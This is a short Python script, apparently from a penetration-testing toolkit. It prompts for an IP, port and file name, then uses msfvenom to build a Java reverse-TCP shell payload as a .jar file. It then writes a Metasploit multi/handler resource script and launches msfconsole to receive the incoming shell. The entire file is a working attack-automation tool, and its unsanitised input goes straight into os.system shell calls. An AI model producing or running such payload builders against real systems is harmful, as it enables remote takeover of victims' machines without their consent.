import os

#GeerxOS on github!

def java_shell_tcp():
    os.system("clear")
    os.system("figlet -f banner Java ")
    print("--> ")
    ip = input("IP: ")
    print("--> ")
    port = input("Port: ")
    print("--> ")
    name = input("Name: ")
    payload = 'java/shell/reverse_tcp'
    format= 'jar'
    ext= '.jar'
    print("[!] Creating payload!! [!] ")
    os.system("msfvenom -p "+payload+" LHOST="+ip+" LPORT="+port+" -f "+format+" -o "+name+ext+"")
    print("Payload created!!")
    print("Running metasploit-framework!")
    os.system("echo 'use exploit/multi/handler' >> java_shell_tcp.rb")
    os.system("echo 'set payload "+payload+"' >> java_shell_tcp.rb")
    os.system("echo 'set lhost "+ip+"' >> java_shell_tcp.rb")
    os.system("echo 'set lport "+port+"' >> java_shell_tcp.rb")
    os.system("echo 'exploit' >> java_shell_tcp.rb")
    os.system("gnome-terminal -- msfconsole -r java_shell_tcp.rb &")
    input("Press enter")
    os.system("clear")